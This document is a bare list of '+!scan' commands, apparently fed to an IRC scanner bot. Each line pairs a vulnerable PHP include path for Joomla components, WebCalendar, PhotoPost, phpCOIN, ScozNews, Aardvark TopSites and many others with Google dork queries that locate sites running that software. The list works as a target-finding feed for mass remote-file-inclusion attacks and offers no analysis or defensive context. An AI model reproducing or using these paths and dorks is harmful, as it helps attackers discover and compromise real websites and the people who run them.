+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= com_serverstat
+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= inurl:"com_serverstat"
+!scan canal.php?meio= allinurl:".php?meio="
+!scan /classes/adodbt/sql.php?classes_dir= "adobt"
+!scan /classes/adodbt/sql.php?classes_dir= adobt
+!scan /classes/adodbt/sql.php?classes_dir= allinurl:adobt
+!scan /classified_right.php?language_dir= "classified.php"
+!scan /classified_right.php?language_dir= classified.php
+!scan /classified_right.php?language_dir= inurl:classified.php phpbazar
+!scan /classified_right.php?language_dir= "phpbazar"
+!scan /classified_right.php?language_dir= phpbazar
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "phpCOIN"
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= phpCOIN
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "phpCOIN 1.2.3"
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= phpCOIN 1.2.3
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "powered by phpCOIN 1.2.3"
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= powered by phpCOIN 1.2.3
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= allinurl:com_extended_registration
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= "com_extended_registration"
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= com_extended_registration
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= allinurl:"com_facileforms"
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= "com_facileforms"
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= com_facileforms
+!scan components/com_performs/performs.php?mosConfig_absolute_path= "com_performs"
+!scan components/com_performs/performs.php?mosConfig_absolute_path= com_performs
+!scan components/com_performs/performs.php?mosConfig_absolute_path= inurl:"com_performs"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= "com_zoom"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= com_zoom
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= "index.php?option="com_zoom"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= inurl:"index.php?option="com_zoom"
+!scan content.php?page= inurl:"content.php?page=*.php"
+!scan /embed/day.php?path= "Calendar"
+!scan /embed/day.php?path= Calendar
+!scan /embed/day.php?path= intitle:"Login to Calendar"
+!scan /embed/day.php?path= "Login to Calendar"
+!scan /embed/day.php?path= Login to Calendar
+!scan /embed/day.php?path= "WebCalendar"
+!scan /embed/day.php?path= WebCalendar
+!scan enc/content.php?Home_Path= "doodle"
+!scan enc/content.php?Home_Path= doodle
+!scan enc/content.php?Home_Path= "doodle cart"
+!scan enc/content.php?Home_Path= doodle cart
+!scan enc/content.php?Home_Path= "powered by doodle cart"
+!scan enc/content.php?Home_Path= powered by doodle cart
+!scan /header.php?abspath= "MobilePublisherPHP"
+!scan /header.php?abspath= MobilePublisherPHP
+!scan impex/ImpExData.php?systempath= intext:powered by vbulletin
+!scan impex/ImpExData.php?systempath= powered by vbulletin
+!scan impex/ImpExData.php?systempath= "vbulletin"
+!scan impex/ImpExData.php?systempath= vbulletin
+!scan /includes/dbal.php?eqdkp_root_path= "EQdkp"
+!scan /includes/dbal.php?eqdkp_root_path= EQdkp
+!scan /includes/dbal.php?eqdkp_root_path= "powered by EQdkp"
+!scan /includes/dbal.php?eqdkp_root_path= powered by EQdkp
+!scan /includes/kb_constants.php?module_root_path= "Base"
+!scan /includes/kb_constants.php?module_root_path= Base
+!scan /includes/kb_constants.php?module_root_path= "Knowledge"
+!scan /includes/kb_constants.php?module_root_path= Knowledge
+!scan /includes/kb_constants.php?module_root_path= "Knowledge Base"
+!scan /includes/kb_constants.php?module_root_path= Knowledge Base
+!scan /includes/kb_constants.php?module_root_path= "Powered by Knowledge Base"
+!scan /includes/kb_constants.php?module_root_path= Powered by Knowledge Base
+!scan index1.php?= "index1.php?="
+!scan index1.php?= index1.php?=
+!scan index1.php?= "index1.php?=*.php?
+!scan index1.php?= inurl:"index1.php?=*.php?
+!scan index2.php?= "index2.php?="
+!scan index2.php?= index2.php?=
+!scan index2.php?= inurl:"index2.php?="
+!scan index2.php?= inurl:"index2.php?=*.php?"
+!scan index.php?body= "index.php?body="
+!scan index.php?body= index.php?body=
+!scan index.php?body= inurl:"index.php?body="
+!scan index.php?go1= "index.php?go1="
+!scan index.php?go1= index.php?go1=
+!scan index.php?go1= inurl:"index.php?go1="
+!scan index.php?go= "index.php?go="
+!scan index.php?go= index.php?go=
+!scan index.php?go= inurl:"index.php?go="
+!scan index.php?pageurl= "index.php?pageurl="
+!scan index.php?pageurl= "index.php?pageurl=*.php"
+!scan index.php?pageurl= index.php?pageurl=*.php
+!scan index.php?pageurl= inurl:"index.php?pageurl=*.php"
+!scan index.php?pageurl= inurl:"index.php?pageurl=*.php
+!scan index.php?pagina1= "index.php?pagina1="
+!scan index.php?pagina1= index.php?pagina1=
+!scan index.php?pagina1= inurl:"index.php?pagina1="
+!scan index.php?pagina= inurl:"index.php?pagina="
+!scan index.php?pagina= inurl:"index.php?pagina=*.php"
+!scan index.php?site1= "index.php?site1="
+!scan index.php?site1= index.php?site1=
+!scan index.php?site1= inurl:"index.php?site1="
+!scan index.php?site= "index.php?site="
+!scan index.php?site= index.php?site=
+!scan index.php?site= inurl:"index.php?site="
+!scan index.php?var1= "index.php?var1="
+!scan index.php?var1= index.php?var1=
+!scan index.php?var2= index.php?var2=
+!scan index.php?var= index.php?va21=
+!scan index.php?var= index.php?var=
+!scan index.php?var= "index.php?var1="
+!scan index.php?var= index.php?var1=
+!scan index.php?var= "index.php?var2="
+!scan index.php?var= index.php?var2=
+!scan index.php?var= "index.php?var=*.php"
+!scan index.php?var= index.php?var=*.php
+!scan index.php?var= inurl:"index.php?var=*.php"
+!scan /login.php?dir= allinurl:login.php?dir=
+!scan /login.php?dir= "login.php?dir="
+!scan /login.php?dir= login.php?dir=
+!scan main.php?id= inurl:"main.php?id=*.php"
+!scan /main.php?sayfa= inurl:"main.php?sayfa="
+!scan /main.php?sayfa= "main.php?sayfa="
+!scan /main.php?sayfa= main.php?sayfa=
+!scan /mcf.php?content= allinurl:"mcf.php"
+!scan mcf.php?content= allinurl:"mcf.php"
+!scan mcf.php?content= "mcf.php"
+!scan mcf.php?content= mcf.php
+!scan /modules/TotalCalendar/about.php?inc_dir= allinurl:/TotalCalendar
+!scan /modules/TotalCalendar/about.php?inc_dir= /TotalCalendar
+!scan /modules/TotalCalendar/about.php?inc_dir= "TotalCalendar"
+!scan /modules/TotalCalendar/about.php?inc_dir= TotalCalendar
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:vwar
+!scan /modules/vwar/admin/admin.php?vwar_root= "vwar"
+!scan /modules/vwar/admin/admin.php?vwar_root= vwar
+!scan phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= "index.php?id="
+!scan phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= index.php?id=
+!scan phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= inurl:"phpwcms/index.php?id="
+!scan phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= "phpwcms/index.php?id="
+!scan phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= phpwcms/index.php?id=
+!scan skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer"
+!scan skins/advanced/advanced1.php?pluginpath[0]= Sabdrimer
+!scan skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"
+!scan skins/advanced/advanced1.php?pluginpath[0]= Sabdrimer CMS
+!scan skins/advanced/advanced1.php?pluginpath[0]= skins/advanced/advanced1.php?pluginpath[0]= "CMS"
+!scan skins/advanced/advanced1.php?pluginpath[0]= skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"
+!scan /skin/zero_vote/error.php?dir= "skin/zero_vote/error.php"
+!scan /skin/zero_vote/error.php?dir= skin/zero_vote/error.php
+!scan /sources/functions.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /sources/functions.php?CONFIG[main_path]= "Powered By ScozNews"
+!scan /sources/functions.php?CONFIG[main_path]= (Powered By ScozNews)
+!scan /sources/functions.php?CONFIG[main_path]= Powered By ScozNews
+!scan /sources/functions.php?CONFIG[main_path]= "ScozNews"
+!scan /sources/functions.php?CONFIG[main_path]= ScozNews
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Aardvark"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Aardvark
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Aardvark TopSites"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Aardvark TopSites
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Powered By Aardvark Topsites PHP 4.2.2"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Powered By Aardvark Topsites PHP 4.2.2
+!scan /sources/template.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /sources/template.php?CONFIG[main_path]= (Powered By ScozNews)
+!scan /sources/template.php?CONFIG[main_path]= Powered By ScozNews
+!scan /sources/template.php?CONFIG[main_path]= "ScozNews"
+!scan /sources/template.php?CONFIG[main_path]= ScozNews
+!scan /surveys/survey.inc.php?path= inurl:surveys
+!scan /surveys/survey.inc.php?path= "surveys"
+!scan /surveys/survey.inc.php?path= surveys
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE"
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:tags.php
+!scan /tags.php?BBCodeFile= inurl:tags.php
+!scan /tags.php?BBCodeFile= "Tagger LE"
+!scan /tags.php?BBCodeFile= Tagger LE
+!scan /tags.php?BBCodeFile= "tags.php"
+!scan /tags.php?BBCodeFile= tags.php
+!scan /templates/headline_temp.php?nst_inc= allintitle:fusion:news:management
+!scan /templates/headline_temp.php?nst_inc= 'fusion"
+!scan /templates/headline_temp.php?nst_inc= "fusion"
+!scan /templates/headline_temp.php?nst_inc= fusion
+!scan /templates/headline_temp.php?nst_inc= fusion:news:management:system
+!scan /templates/headline_temp.php?nst_inc= "management"
+!scan /templates/headline_temp.php?nst_inc= management
+!scan /templates/headline_temp.php?nst_inc= "news"
+!scan /templates/headline_temp.php?nst_inc= news
+!scan /templates/headline_temp.php?nst_inc= "system"
+!scan /templates/headline_temp.php?nst_inc= system
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan /tools/send_reminders.php?includedir= "day.php?date="
+!scan /tools/send_reminders.php?includedir= day.php?date=
+!scan /ws/get_events.php?includedir= /WebCalendar/
+!scan /ws/get_events.php?includedir= "/WebCalendar/"
+!scan /ws/get_events.php?includedir= "WebCalendar"
+!scan /ws/get_events.php?includedir= WebCalendar
+!scan /zipndownload.php?PP_PATH= "PhotoPost"
+!scan /zipndownload.php?PP_PATH= PhotoPost
+!scan /zipndownload.php?PP_PATH= "PhotoPostP"
+!scan /zipndownload.php?PP_PATH= "PhotoPost PHP"
+!scan /zipndownload.php?PP_PATH= "PhotoPost PHP 4.6"
+!scan /zipndownload.php?PP_PATH= PhotoPost PHP 4.6
+!scan /zipndownload.php?PP_PATH= "Powered by: PhotoPost PHP 4.6"
+!scan /zipndownload.php?PP_PATH= Powered by: PhotoPost PHP 4.6
+!scan cmd.php?arg= allinurl:.php?arg=
+!scan /codebb/lang_select?phpbb_root_path= codebb
+!scan /codebb/lang_select?phpbb_root_path= codebb 1.1b3
+!scan components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= com_rsgallery
+!scan components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= rs gallery
+!scan components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= rsgallery
+!scan components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= rsgallery.php
+!scan content.php?inc= allinurl:".php?inc="
+!scan content.php?seite= allinurl:content.php?seite=
+!scan content.php?seite= allinurl:.php?seite=
+!scan dbase.php?action= dbase.php
+!scan dbase.php?action= dbase.php?action=
+!scan dbase.php?action= .php?action=
+!scan default.php?arquivo= allinurl:.php?arquivo=
+!scan default.php?vis= allinurl:".php?vis="
+!scan define.php?term= allinurl:".php?term="
+!scan detail.php?prod= allinurl:"detail.php?prod="
+!scan detail.php?prod= allinurl:".php?prod="
+!scan details.php?loc= details.php?loc=
+!scan details.php?loc= .php?loc=
+!scan directions.php?loc= directions.php?loc=
+!scan direct.php?loc= direct.php?loc=
+!scan display.php?f= display.php?f=
+!scan display.php?file= display.php?file=
+!scan display.php?lang= display.php?lang=
+!scan display.php?l= display.php?l=
+!scan display.php?ln= display.php?ln=
+!scan display.php?pag= display.php?pag=
+!scan display.php?page= allinurl:"display.php?page="
+!scan display.php?page= allinurl:".php?page="
+!scan display.php?page=&lang= allinurl:"display.php?page="
+!scan display.php?page=&lang= allinurl:".php?page="
+!scan display.php?p= display.php?p=
+!scan display.php?pg= display.php?pg=
+!scan display.php?s= display.php?s=
+!scan display.php?table= allinurl:display.php?table=
+!scan display.php?table= allinurl:.php?table=
+!scan download.php?sub= "download.php?sub="
+!scan download.php?sub= download.php?sub=
+!scan eng.php?img= eng.php?img=
+!scan eng.php?img= .php?img=
+!scan /exibir.php?arquivo= allinurl:.php?arquivo=
+!scan experts.php?sub= "experts.php?sub="
+!scan experts.php?sub= experts.php?sub=
+!scan forum.php?seite= allinurl:.php?seite=
+!scan frag.php?exec= allinurl:"frag.php"
+!scan frag.php?exec= allinurl:"frag.php?exec="
+!scan frag.php?exec= allinurl:".php?exec="
+!scan frame.php?loc= allinurl:".php?loc="
+!scan galerie.php?do= allinurl:".php?do="
+!scan glossary.php?term= allinurl:".php?term="
+!scan handlinger.php?vis= allinurl:".php?vis="
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHP Ged View
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHP GedView
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHPGedView
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHPGedView <= 3.3.7
+!scan home1.php?ln= allinurl:.php?ln=
+!scan home2.php?ln= allinurl:.php?ln=
+!scan home.php?a= allinurl:"home.php?a="
+!scan home.php?a= allinurl:".php?a="
+!scan home.php?act= "home.php?act="
+!scan home.php?act= home.php?act=
+!scan home.php?arg= allinurl:.php?arg=
+!scan home.php?func= allinurl:".php?func="
+!scan home.php?i= "home.php?i="
+!scan home.php?i= home.php?i=
+!scan home.php?inc= "home.php?inc="
+!scan home.php?inc= home.php?inc=
+!scan home.php?ln= allinurl:.php?ln=
+!scan home.php?ltr= allinurl:".php?ltr="
+!scan home.php?sit= allinurl:".php?sit="
+!scan home.php?table= allinurl:.php?table=
+!scan image.php?img= image.php?img=
+!scan image.php?img= .php?img=
+!scan img.php?loc= allinurl:"img.php?loc="
+!scan img.php?loc= allinurl:".php?loc="
+!scan inc.php?inc= allinurl:".php?inc="
+!scan index1.php?arg= allinurl:.php?arg=
+!scan index1.php?arq= allinurl:.php?arq=
+!scan index1.php?func= allinurl:".php?func="
+!scan index1.php?inc= allinurl:".php?inc="
+!scan index1.php?lk= allinurl:".php?lk="
+!scan /index1.php?ln= allinurl:.php?ln=
+!scan index1.php?ltr= allinurl:".php?ltr="
+!scan index1.php?mid= allinurl:index1.php?mid=
+!scan index1.php?page= allinurl:"index1.php?page="
+!scan index1.php?p= allinurl:".php?p="
+!scan index1.php?p= allinurl:".php?pag="
+!scan index1.php?p= allinurl:".php?page="
+!scan index1.php?p= allinurl:".php?pg="
+!scan index1.php?s= allinurl:"index1.php?s="
+!scan index1.php?show= allinurl:"index1.php?show="
+!scan index1.php?show= allinurl:".php?show="
+!scan index1.php?table= allinurl:.php?table=
+!scan index2.php?arg= allinurl:.php?arg=
+!scan index2.php?arq= allinurl:.php?arq=
+!scan index2.php?c= allinurl:"index2.php?c="
+!scan index2.php?c= allinurl:".php?c="
+!scan index2.php?cont= allinurl:"index2.php?cont="
+!scan index2.php?cont= allinurl:".php?cont="
+!scan index2.php?content= allinurl:"index2.php?cont="
+!scan index2.php?content= allinurl:"index2.php?content="
+!scan index2.php?content= allinurl:".php?content="
+!scan index2.php?content= index2.php?content=
+!scan index2.php?content= .php?content=
+!scan index2.php?i= /index2.php?i=
+!scan index2.php?inc= allinurl:".php?inc="
+!scan index2.php?l= allinurl:".php?l="
+!scan index2.php?lg= allinurl:"index.php?lg="
+!scan index2.php?lk= allinurl:".php?lk="
+!scan index2.php?ln= allinurl:"index.php?ln="
+!scan index2.php?ln= allinurl:".php?ln="
+!scan index2.php?lng= allinurl:"index.php?lng="
+!scan index2.php?loca= index2.php?loca=
+!scan index2.php?loca= .php?loca=
+!scan index2.php?meio= allinurl:.php?meio=
+!scan index2.php?s= allinurl:"index2.php?s="
+!scan index2.php?s= allinurl:".php?s="
+!scan index2.php?table= allinurl:.php?table=
+!scan index2.php?x= allinurl:index2.php?x=
+!scan index2.php?x= allinurl:.php?x=
+!scan index.php3?act= allinurl:index.php3?act=
+!scan index.php3?act= allinurl:.php3?act=
+!scan index.php3?act= allinurl:".php3?act="
+!scan index.php3?file= allinurl:".php3?f="
+!scan index.php3?file= allinurl:".php3?file="
+!scan index.php3?id= index.php3?id=
+!scan index.php3?i= index.php3?i=
+!scan index.php3?lang= index.php3?lang=
+!scan index.php3?l= index.php3?l=
+!scan index.php3?page= index.php3?page=
+!scan index.php3?pag= index.php3?pag=
+!scan index.php3?p= allinurl:"index.php3?p="
+!scan index.php3?p= allinurl:"index.php3?pag="
+!scan index.php3?p= allinurl:"index.php3?page="
+!scan index.php3?p= allinurl:"index.php3?pg="
+!scan index.php3?pg= index.php3?pg=
+!scan index.php3?p= index.php3?p=
+!scan index.php3?s= allinurl:"index.php3?s="
+!scan index.php3?s= allinurl:index.php3?s=
+!scan index.php3?s= allinurl:.php3?s=
+!scan index.php3?s= allinurl:".php3?s="
+!scan index.php4?lang= allinurl:"index.php4?lang="
+!scan index.php4?lang= allinurl:index.php4?lang="
+!scan index.php4?lang= allinurl:.php4?lang=
+!scan index.php4?lang= allinurl:".php4?lang="
+!scan index.php4?lang= .php4?lang=
+!scan index.php5?lang= allinurl:"index.php5?lang="
+!scan index.php5?lang= allinurl:index.php5?lang=
+!scan index.php5?lang= allinurl:".php5?lang="
+!scan index.php?a= allinurl:"index.php?a="
+!scan index.php?a= allinurl:".php?a="
+!scan index.php?acao= allinurl:index.php?acao=
+!scan index.php?acao= allinurl:.php?acao=
+!scan index.php?act= "index.php?act="
+!scan index.php?act= index.php?act=
+!scan index.php?action= allinurl:"index.php?action="
+!scan index.php?action= allinurl:".php?action="
+!scan index.php?arg= allinurl:index.php?arg=
+!scan index.php?arg= allinurl:.php?arg=
+!scan index.php?arq= allinurl:index.php?arq=
+!scan index.php?arq= allinurl:.php?arq=
+!scan index.php?arquivo= allinurl:.php?arquivo=
+!scan index.php?ba= allinurl:"index.php?ba="
+!scan index.php?b= allinurl:"index.php?b="
+!scan index.php?bas= allinurl:"index.php?bas="
+!scan index.php?bas= allinurl:".php?bas="
+!scan index.php?cal= index.php?cal=
+!scan index.php?cal= inurl:"index.php?cal="
+!scan index.php?cal= inurl:".php?cal="
+!scan index.php?c= allinurl:"index.php?c="
+!scan index.php?cal= .php?cal=
+!scan index.php?c= index.php?c=
+!scan index.php?c= inurl:"index.php?c="
+!scan index.php?c= inurl:".php?c="
+!scan /index.php?cms= allinurl:/index.php?cms=
+!scan /index.php?cms= allinurl:"/index.php?cms="
+!scan index.php?command= allinurl:"index.php?command="
+!scan index.php?command= allinurl:".php?command="
+!scan index.php?content= index.php?content=
+!scan index.php?content= .php?content=
+!scan index.php?c= .php?c=
+!scan index.php?d1= allinurl:".php?d1="
+!scan index.php?def= allinurl:"index.php?def="
+!scan index.php?def= allinurl:".php?def="
+!scan index.php?def= index.php?def=
+!scan /index.php?dn= allinurl:/index.php?dn=
+!scan /index.php?dn= allinurl:"index.php?dn="
+!scan /index.php?dn= allinurl:.php?dn=
+!scan /index.php?dn= allinurl:".php?dn="
+!scan index.php?dok= allinurl:"index.php?dok="
+!scan index.php?dok= allinurl:".php?dok="
+!scan index.php?e= allinurl:"index.php?e="
+!scan index.php?exec= index.php?exec=
+!scan index.php?exec= .php?exec=
+!scan index.php?f1= allinurl:".php?f1="
+!scan index.php?f= allinurl:"index.php?f="
+!scan index.php?fase= allinurl:"index.php?fase="
+!scan index.php?fase= allinurl:".php?fase="
+!scan index.php?file= allinurl:"index.php?file="
+!scan index.php?fn= allinurl:"index.php?fn="
+!scan index.php?fn= allinurl:".php?fn="
+!scan index.php?fPage= allinurl:"index.php?fPage="
+!scan index.php?fPage= allinurl:index.php?fPage=
+!scan index.php?fPage= allinurl:.php?fPage=
+!scan index.php?fPage= allinurl:".php?fPage="
+!scan index.php?fPage= index.php?fPage=
+!scan index.php?fset= allinurl:".php?fset="
+!scan index.php?func= allinurl:".php?func="
+!scan index.php?goto= allinurl:"index.php?goto="
+!scan index.php?goto= allinurl:".php?goto="
+!scan index.php?id=1&lang= index.php?i=
+!scan index.php?id=1&lang= "index.php?id="
+!scan index.php?id=1&lang= index.php?id=
+!scan index.php?id=1&lang= ".php?id="
+!scan index.php?id= allinurl:"index.php?id="
+!scan /index.php?id=&lang= allinurl:"index.php?id="
+!scan /index.php?id=&lang= allinurl:".php?id="
+!scan index.php?id=&lang= "index.php?id="
+!scan index.php?id=&lang= ".php?id="
+!scan /index.php?id=&page= allinurl:"index.php?id="
+!scan /index.php?id=&page= allinurl:".php?id="
+!scan index.php?inc= allinurl:".php?inc="
+!scan index.php?ir= ".php?ir="
+!scan /index.php?lang=en&cat= allinurl:"index.php?lang="
+!scan /index.php?lang=en&cat= allinurl:".php?lang="
+!scan /index.php?lang=en&page= allinurl:"index.php?lang="
+!scan /index.php?lang=en&page= allinurl:".php?lang="
+!scan /index.php?lang=en&page= index.php?lang=
+!scan index.php?lang=en&page= index.php?lang=
+!scan /index.php?lang=en&page= .php?lang=
+!scan index.php?lang=en&page= .php?lang=
+!scan index.php?lang= "index.php?lang="
+!scan index.php?lang= index.php?lang=
+!scan index.php?lang=&page= index.php?lang=
+!scan index.php?lang=&page= .php?lang=
+!scan index.php?lg= "index.php?lg="
+!scan index.php?lg= index.php?lg=
+!scan index.php?lk= allinurl:".php?lk="
+!scan /index.php?ln= allinurl:.php?ln=
+!scan index.php?lng= "index.php?lng="
+!scan index.php?lng= index.php?lng=
+!scan index.php?ln= "index.php?ln="
+!scan index.php?ln= index.php?ln=
+!scan index.php?ln= inurl:"index.php?ln="
+!scan index.php?ln= inurl:".php?ln="
+!scan index.php?lnk= allinurl:index.php?lnk=
+!scan index.php?lnk= allinurl:.php?lnk=
+!scan index.php?lnk= inurl:"allinurl:index.php?lnk="
+!scan index.php?lnk= inurl:"allinurl:.php?lnk="
+!scan index.php?ln= .php?ln=
+!scan index.php?loca= index.php?loca=
+!scan /index.php?loc= allinurl:".php?loc="
+!scan index.php?loca= .php?loca=
+!scan /index.php?loc=&cat= allinurl:"index.php?loc="
+!scan /index.php?loc=&cat= allinurl:".php?loc="
+!scan /index.php?loc=&lang= allinurl:"index.php?loc="
+!scan /index.php?loc=&lang= allinurl:".php?loc="
+!scan /index.php?loc=&page= allinurl:"index.php?loc="
+!scan /index.php?loc= .php?loc=
+!scan /index.php?loc=start&page= allinurl:"index.php?loc="
+!scan index.php?ltr= allinurl:"index.php?ltr="
+!scan index.php?ltr= allinurl:".php?ltr="
+!scan index.php?main= allinurl:".php?main="
+!scan index.php?m= allinurl:"index.php?m="
+!scan index.php?meio= allinurl:"index.php?meio="
+!scan index.php?meio= allinurl:index.php?meio=
+!scan index.php?meio= allinurl:.php?meio=
+!scan index.php?meio= allinurl:".php?meio="
+!scan index.php?mf= allinurl:index.php?mf=
+!scan index.php?mf= allinurl:.php?mf=
+!scan index.php?mf= allinurl:".php?mf="
+!scan index.php?mid= allinurl:"index.php?mid="
+!scan index.php?mid= allinurl:index.php?mid=
+!scan index.php?mid= allinurl:.php?mid=
+!scan index.php?mid= allinurl:".php?mid="
+!scan index.php?middle= allinurl:"index.php?middle="
+!scan index.php?middle= allinurl:index.php?middle=
+!scan index.php?middle= allinurl:".php?middle="
+!scan index.php?mn= allinurl:"index.php?mn="
+!scan index.php?mn= allinurl:".php?mn="
+!scan index.php?mod= allinurl:"index.php?mod="
+!scan index.php?mod= allinurl:".php?mod="
+!scan index.php?new= allinurl:"index.php?new="
+!scan index.php?news= allinurl:"index.php?news="
+!scan index.php?page1= allinurl:"index.php?page1="
+!scan index.php?page1= allinurl:".php?page1="
+!scan index.php?page= allinurl:php5?page=
+!scan index.php?page= index.php?page=
+!scan index.php?page=&lang= index.php?p=
+!scan index.php?page=&lang= index.php?pag=
+!scan index.php?page=&lang= index.php?page=
+!scan index.php?page=&lang= index.php?pg=
+!scan index.php?page=&lang= .php?p=
+!scan index.php?page=&lang= .php?pag=
+!scan index.php?page=&lang= .php?page=
+!scan index.php?page=&lang= .php?pg=
+!scan index.php?pageN= allinurl:".php?pageN="
+!scan index.php?pager= index.php?pager=
+!scan index.php?pager= .php?pager=
+!scan index.php?pagina= "index.php?pagina="
+!scan index.php?pagina= index.php?pagina=
+!scan index.php?pag= "index.php?pag="
+!scan index.php?pag= index.php?pag=
+!scan index.php?p= allinurl:"index.php?p="
+!scan index.php?pg= "index.php?pg="
+!scan index.php?pg= index.php?pg=
+!scan index.php?prod= allinurl:".php?prod="
+!scan index.php?prod= allinurl:".php?product="
+!scan index.php?product= allinurl:".php?prod="
+!scan index.php?product= allinurl:".php?product="
+!scan index.php?r= allinurl:"index.php?r="
+!scan index.php?s= allinurl:"index.php?s="
+!scan index.php?s= allinurl:index.php?s=
+!scan index.php?s= allinurl:.php?s=
+!scan index.php?s= allinurl:".php?s="
+!scan index.php?secao= allinurl:index.php?secao=
+!scan index.php?secao= allinurl:.php?secao=
+!scan index.php?secao= inurl:"allinurl:index.php?secao="
+!scan index.php?secao= inurl:"allinurl:.php?secao="
+!scan /index.php?seccion= allinurl:/index.php?seccion=
+!scan /index.php?seccion= allinurl:.php?seccion=
+!scan index.php?sec= "index.php?sec="
+!scan index.php?sec= index.php?sec=
+!scan /index.php?seite= allinurl:/index.php?seite=
+!scan /index.php?seite= allinurl:.php?seite=
+!scan index.php?select= allinurl:".php?select="
+!scan index.php?select= index.php?select=
+!scan index.php?select= .php?select=
+!scan index.php?set= allinurl:"index.php?set="
+!scan index.php?set= allinurl:index.php?set=
+!scan index.php?set= allinurl:.php?set=
+!scan index.php?set= allinurl:".php?set="
+!scan index.php?sf= allinurl:"index.php?sf="
+!scan index.php?show= allinurl:".php?show="
+!scan index.php?s= "index.php?s="
+!scan index.php?s= index.php?s=
+!scan index.php?sit= allinurl:"index.php?sit="
+!scan index.php?sit= allinurl:".php?sit="
+!scan /index.php?slang= inurl:/index.php?slang=
+!scan /index.php?slang= inurl:"index.php?slang="
+!scan /index.php?slang= inurl:.php?slang=
+!scan /index.php?slang= inurl:".php?slang="
+!scan index.php?sort= allinurl:".php?sort="
+!scan index.php?spage= allinurl:"index.php?spage="
+!scan index.php?spage= allinurl:index.php?spage=
+!scan index.php?spage= allinurl:.php?spage=
+!scan index.php?spage= allinurl:".php?spage="
+!scan index.php?ss= allinurl:"index.php?ss="
+!scan index.php?ss= allinurl:".php?ss="
+!scan index.php?st= allinurl:"index.php?st="
+!scan index.php?sub= allinurl:"index.php?sub="
+!scan index.php?sub= allinurl:index.php?sub=
+!scan index.php?sub= allinurl:.php?sub=
+!scan index.php?sub= "index.php?sub="
+!scan index.php?sub= index.php?sub=
+!scan index.php?sub= inurl:"allinurl:"index.php?sub=""
+!scan index.php?sub= inurl:"allinurl:index.php?sub="
+!scan index.php?sub= inurl:"allinurl:.php?sub="
+!scan index.php?subpage= allinurl:"index.php?subpage="
+!scan index.php?subpage= allinurl:".php?subpage="
+!scan index.php?subp= allinurl:"index.php?subp="
+!scan index.php?subp= allinurl:".php?subp="
+!scan index.php?table= allinurl:index.php?table=
+!scan index.php?table= allinurl:.php?table=
+!scan index.php?t= allinurl:"index.php?t="
+!scan index.php?task= allinurl:index.php?task=
+!scan index.php?task= allinurl:.php?task=
+!scan index.php?term= allinurl:".php?term="
+!scan index.php?textfield= allinurl:".php?textfield="
+!scan index.php?theme= allinurl:index.php?theme=
+!scan index.php?theme= allinurl:.php?theme=
+!scan index.php?theme= .php?theme=
+!scan index.php?trans= allinurl:"index.php?trans="
+!scan index.php?trans= allinurl:".php?trans="
+!scan index.php?v= allinurl:"index.php?v="
+!scan index.php?ver= allinurl:"index.php?ver="
+!scan index.php?ver= allinurl:index.php?ver=
+!scan index.php?ver= allinurl:.php?ver=
+!scan index.php?ver= allinurl:".php?ver="
+!scan index.php?ver= .php?ver=
+!scan /index.php?vis= allinurl:/index.php?vis=
+!scan /index.php?vis= allinurl:.php?vis=
+!scan index.php?way= index.php?way=
+!scan index.php?way= .php?way=
+!scan index.php?wpage= allinurl:"index.php?wpage="
+!scan index.php?wpage= allinurl:".php?wpage="
+!scan info.php?ln= allinurl:"info.php?ln="
+!scan info.php?ln= allinurl:info.php?ln=
+!scan info.php?ln= allinurl:".php?ln="
+!scan /interna.php?meio= allinurl:".php?meio="
+!scan kalender.php?vis= allinurl:"kalender.php"
+!scan kalender.php?vis= allinurl:"kalender.php?vis="
